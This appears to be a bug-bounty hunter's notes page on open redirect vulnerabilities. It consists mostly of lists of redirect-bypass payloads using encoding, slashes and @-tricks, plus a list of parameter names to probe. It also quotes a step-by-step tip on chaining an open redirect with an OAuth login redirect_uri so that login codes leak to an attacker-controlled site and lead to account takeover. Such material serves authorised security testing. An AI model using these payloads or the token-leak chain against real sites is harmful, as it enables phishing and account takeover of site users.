# Open Redirect

![[Pasted image 20240527191733.png]]

# Open Redirect

```
////example.com/%2e%2e
////example.com/%2e%2e%2f
////example.com/%2f%2e%2e
////example.com/%2f..
////example.com//
///\;@example.com
///example.com
///example.com/
///example.com/%2e%2e
///example.com/%2e%2e%2f
///example.com/%2f%2e%2e
///example.com/%2f..
///example.com//
//example.com
//example.com/
//example.com/%2e%2e
//example.com/%2e%2e%2f
//example.com/%2f%2e%2e
//example.com/%2f..
//example.com//
//google%00.com
//google%E3%80%82com
//https:///example.com/%2e%2e
//https://example.com/%2e%2e%2f
//https://example.com//
/<>//example.com
/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com
/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
/\/\/example.com/
/\/example.com/
/example.com/%2f%2e%2e
/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Http
//example.com@google.com/%2f..
///google.com/%2f..
///example.com@google.com/%2f..
////google.com/%2f..
https://google.com/%2f..
https://example.com@google.com/%2f..
/https://google.com/%2f..
/https://example.com@google.com/%2f..
//google.com/%2f%2e%2e
//example.com@google.com/%2f%2e%2e
///google.com/%2f%2e%2e
///example.com@google.com/%2f%2e%2e
////google.com/%2f%2e%2e
/http://example.com
/http:/example.com
/https:/%5cexample.com/
/https://%09/example.com
/https://%5cexample.com
/https:///example.com/%2e%2e
/https:///example.com/%2f%2e%2e
/https://example.com
/https://example.com/
/https://example.com/%2e%2e
/https://example.com/%2e%2e%2f
/https://example.com/%2f%2e%2e
/https://example.com/%2f..
/https://example.com//
/https:example.com
/%09/example.com
/%2f%2fexample.com
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
```

```
💰 Bug Bounty Tips: How can you maximize payouts for "Low" risk open redirect issues? 🤑  
  
I've personally earned over $$$$$ in bounties by chaining open redirect submissions to ATOs. These "Low" severity bugs can often be escalated through a double redirection, resulting in bounties ranging from $750 to $5000, depending on the program.  
  
Open redirects can be chained with legitimate redirects, allowing attackers to exfiltrate OAuth codes and tokens for potential account takeovers.  
  
Here's the quick breakdown:  
(1) Find a low-severity open redirect, for example: https://example[.]com/next-step?url=https://attackersite[.]com….  
(2) Look for site login functionality on core domains or subdomains. Assuming login is integrated with Auth0 or another equivalent service provider at http://login[.]example[.]com. In such cases, a valid redirect would usually look something like https://login[.]example[.]com/?redirect_uri=  
(3) You can now chain the vulnerable open redirect identified in step 1 with the login page and still be able to exfiltrate the login code in most cases. For example, you could craft a URI like https://login.example[.]com/?redirect_uri=https://example[.]com/next-step%3furl=https://attackersite[.]com…  
  
When a victim navigates to the above link and logs in, upon successful login, it will redirect them in this flow to the attacker controlled site:  
https://login.example[.]com -> (First Redirect) https://example[.]com/next-step?code=:logincode:&state=:state…: -> (Second Redirect) https://attackersite[.]com/?code=:logincode:&state=:state…:  
  
As a result, this ultimately leads to the leakage of Auth0 or other equivalent codes/tokens to an attacker-controlled server, resulting in an ATO.  
  
Common mistakes: Reporting open redirects as simple issues without escalating their impact. Don't underestimate their potential. Always look for ways to level up! 💡
```

look for (dork)
```
return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url,
history, goback, redirectTo, redirectUrl, redirUrl
```


```
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
ZSeanos Methodology - https://www.bugbountyhunter.com/ Page 23
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/
https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use # \ also)
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (Also try %09, %00, %0a, %07)
/%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com
```

encode something that will force the browser to decode it and then redirect
```
/redirect%3Fgoto=https://www.zseano.com/%253Fexample=hax
```


Hop 2 times and encode to bypass
```
https://example.com/login?return=https://example.com/?redirect=1%26returnurl=http
```

```
https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect=1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F
```